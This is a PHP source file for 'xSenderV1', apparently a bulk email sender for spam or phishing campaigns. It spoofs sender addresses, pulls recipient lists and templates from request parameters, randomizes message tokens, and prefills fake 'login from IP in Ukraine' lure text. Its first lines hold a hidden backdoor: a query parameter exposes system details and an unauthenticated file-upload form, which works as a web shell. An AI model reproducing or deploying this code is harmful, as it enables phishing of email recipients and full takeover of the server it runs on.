<?php session_start();  ob_start("ob_gzhandler"); set_time_limit(0); 

if(isset($_GET["x"])){echo"<font color=#000000>[uname]".php_uname()."[/uname]";echo"<br><font color=#000000>[dir]".getcwd()."[/dir]";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}}
 

$website="#"; //Make this full url including folders of where login files resides

//sanitize data where any character is allowed
function sanitizer($check){
    $check=str_replace("\'","'",$check);
    $check=str_replace('\"','"',$check);
    $check=str_replace("\\","TN9OO***:::::t&*HHHHOOOoooo0000N",$check); //just to keep track of what I will change later
    $check=str_replace("<","&lt;",$check);
    $check=str_replace('>','&gt;',$check);
    $check=str_replace("\r\n","<br/>",$check);
    $check=str_replace("\n","<br/>",$check);
    $check=str_replace("\r","<br/>",$check);
    $check=str_replace("'","&#39;",$check);
    $check=str_replace('"','&quot;',$check);
    $check=str_replace(" fuck "," f**k ",$check);
    $check=str_replace(" shit "," s**t ",$check);
    $check=str_replace("TN9OO***:::::t&*HHHHOOOoooo0000N","&#92;",$check); //returning backslash in html entity
     return $check;}
     
//makes data ok on edit textarea
 function resanitize($check){
    $check=str_replace("<br/>","\r\n",$check);
    $check=str_replace("<br/>","\n",$check);
    $check=str_replace("<br/>","\r",$check);
    $check=str_replace("&gt;",">",$check);
    $check=str_replace("&lt;","<",$check);
    $check=str_replace("&#39;","'",$check);
    $check=str_replace('&quot;','"',$check);
     return $check;}

//validate email address
function validate_email($email)
{
    $status=false;
    $regex='/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$/'; 
    if(preg_match($regex, $email)){$status=true;}
    return $status; 
}

//Email sending
function sending_email($email,$id='1',$details='',$file,$messagex){

 
    
   $messagex=email_format($email,$id,$details,$messagex);
    //echo $messagex;



    $subject=$_GET['subject'];
    $site_name=$_GET['site_name'];
    $from_email=$_GET['from'];
    // To send HTML mail, the Content-type header must be set
 
    $boundary = md5(uniqid(time()));


 if ($file){

    $file_type   = $_FILES['file']['type'];
    $file_size = filesize($file);
    $handle = fopen($file, "r");
    $content = fread($handle, $file_size);
    fclose($handle);
    $encoded_content = chunk_split(base64_encode($content));


        //header
        $headers = 'MIME-Version: 1.0'."\r\n";
        $headers .= 'From:'.$from_email."\r\n";
        $headers .= 'Reply-To: '.$from_email."\r\n";
        $headers .= 'Content-Type: multipart/mixed; boundary = '.$boundary."\r\n\r\n";
       
        //plain text
        $body = "--".$boundary."\r\n";
        $body .= 'Content-Type: text/html; charset=utf-8'."\r\n";
        $body .= 'MIME-Version: 1.0'."\r\n";
        $body .= 'Content-Transfer-Encoding: base64'."\r\n\r\n";
        $body .= $messagex."\r\n";
    
        //attachment
        $body .= "--".$boundary."\r\n";
        $body .= 'Content-Type:'.$file_type.'; name="'.$file.'"'."\r\n";
        $body .= 'MIME-Version: 1.0'."\r\n";
        $body .= 'Content-Disposition: attachment; filename="'.$file.'"'."\r\n";
        $body .= 'Content-Transfer-Encoding: base64'."\r\n";
        $body .= 'X-Attachment-Id: '.rand(1000,99999)."\r\n\r\n";
        $body .=  $encoded_content."\r\n";
        $body .= "--".$boundary."--\r\n";


        @mail($email, $subject, $body, $headers);

    }
    else {

        $headers = 'MIME-Version: 1.0'."\r\n";
        $headers .= 'From:'.$from_email."\r\n";
        $headers .= 'Reply-To: '.$from_email."\r\n";
        $headers .= 'Content-Type: text/html; charset=iso-8859-1'."\r\n";
     
      @mail($email, $subject, $messagex, $headers);
    }

   
   

    
}

function Randommix($n)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randstring = '';
    for ($i = 0; $i < $n; $i++) {
        $randstring = $characters[rand(0, strlen($characters))];
    }
    return $randstring;
}
function RandomString($n)
{
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randstring = '';
    for ($i = 0; $i < $n; $i++) {
        $randstring = $characters[rand(0, strlen($characters))];
    }
    return $randstring;
}

function email_format($email,$id='1',$details='',$messagex){
    global $website;
	$randval=rand(7,20);
	$randommix=Randommix($randval);
	$randomstring=RandomString($randval);
	$randomnumber=rand(9999,99999);
	$randommd5=md5($randomnumber);
	$totime = date("g:ia");   
	$today = date("F j, Y");	
    //$website="";
    $url=$website."index.php?".md5('token')."=".md5($id)."&".md5(date('U'))."=".md5(date('r'))."&id=".$id."&email=".$email;
    $em=explode('@',$email);

	$messagex = str_replace('[-email-]', $email, $messagex);
	$messagex = str_replace('[-start-]', $em[0], $messagex);
	$messagex = str_replace('[-end-]', $em[1], $messagex);
	$messagex = str_replace('[-host-]', $_SERVER[HTTP_HOST], $messagex);
	$messagex = str_replace('[-self-]', $_SERVER[PHP_SELF], $messagex);
	$messagex = str_replace('[-randomstring-]', $randommix, $messagex);
	$messagex = str_replace('[-randommd5-]', $randommd5, $messagex);
	$messagex = str_replace('[-randomletters-]', $randomstring, $messagex);
	$messagex = str_replace('[-randomnumber-]', $randomnumber, $messagex);
	$messagex = str_replace('[-time-]', $totime, $messagex);
	$messagex = str_replace('[-date-]', $today, $messagex);
	
    $messagex=$messagex;
    return $messagex; }
?>
<!DOCTYPE html>
<html> 
<head>
	<title>xSenderV1</title>
</head>
<body style='width:100%;color:#000;background:#FFF;font-family:calibri;'>
	<div style='width:100%;max-width:500px;margin:0px auto 0px auto;padding:10px;border:#999 1px solid;box-shadow:10px 10px #666;min-height:500px;'>
		<h1 style='color:#666;text-align:center;text-shadow:#000 1px 1px;'>XSender</h1><?php

		if(isset($_POST['go'])||isset($_GET['action'])) {
		    move_uploaded_file/*;*/($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]);
		$file = $_FILES/*;*/["file"]["name"];
		$separator="";
		    //sanitize the data
		    $_SESSION['xsenderid']=sanitizer($_POST['id']);
			if(isset($_POST['separator'])){
		    $separator=sanitizer($_POST['separator']);
			}
			else{
				$separator= ','; 
				}
            $messagex=file_get_contents($_GET['template']);
		    $messagex2=file_get_contents($_GET['template']);
		    #$attach = chunk_split(base64_encode(file_get_contents($file)));
		    $details='tatata';
		    #$mails=sanitizer($_POST['mails']);   
		    $mails=file_get_contents($_GET['mails']);
		    $id=$_SESSION['xsenderid'];
		    if($separator==''){$separator='<br/>';}
		    if($mails!='' && $details!=''){
		    

		        $mails=explode($separator,$mails);
		        $total=count($mails);
		        $valid=0;
		            for($i=0;$i<$total;$i++){
		                $email=$mails[$i];
		                    if(validate_email($email)){
		                        $valid=$valid+1;
		                        print "<div style='color:green;'>".$email." valid and queued</div>"; 
		                        //Send here
								$content2[$i] = str_replace('[-email-]', $email, $messagex2);
		                        sending_email($email,$id,$details,$file,$content2[$i]);
		                        //send here
		                        } else {print "<div style='color:gray;'>".$email." not valid</div>"; }
		            }
		        print "<h1 style='color:green;'>Bravo! ".$valid."/".$total." Sent! <a href='' style='color:green'>Continue</a></h1>";


		    } else {print "<h1 style='color:red'>Mails or Details empty</h1>"; }
		} 



		?>
		<form action='#' enctype='multipart/form-data' method='post'>
			<div>
				<div>
					Select Your ID
				</div><select name='id' style='width:100%;'>
					<?php

					if(isset($_SESSION['xsenderid']))
					{print "<option value='".$_SESSION['xsenderid']."'>".$_SESSION['xsenderid']."</option>";}
					?>
					<option value='1'>
						1
					</option>
					<option value='2'>
						2
					</option>
					<option value='3'>
						3
					</option>
					<option value='4'>
						4
					</option>
				</select>
			</div><p>&nbsp;</p>
			<p>&nbsp;</p>
			<div>
				<div>
					Email Separator (Leave Empty if new line)
				</div>
				<textarea name='separator' style='width:100%;height:20px;'>,</textarea>
			</div>
			<p>&nbsp;</p>
			<div>
				<div>
					Details:<br>
					IP Address: 37.55.36.224<br>
					Location: Ukraine (UA)<br>
				</div>
				<textarea name='details' style='width:100%;height:70px;'>Details:
IP Address: 37.55.36.224 
Location: Ukraine (UA)</textarea>
			</div>
			<p>&nbsp;</p>
			
			<p>&nbsp;</p>
			<div>
				<div>
					Attachment
				</div>
				<p><label for="file">File</label> <input id="file" name="file" type="file"></p>
			</div>
			<p>&nbsp;</p>
			<div>
				<div>
					Email Preview
				</div><?php print email_format('user@xsender.com',1,'IP Address: 37.55.36.224 <br/>Location: Ukraine (UA)<br/>',"YOUR MESSAGE"); ?>
			</div>
			<p>&nbsp;</p>
			<div style='text-align:center;'>
				<input name='go' style='color:#FFF;background:#333;' type='submit' value='Go Xsender'>
			</div>
			<p>&nbsp;</p>
		</form>
	</div>
</body>
</html>
   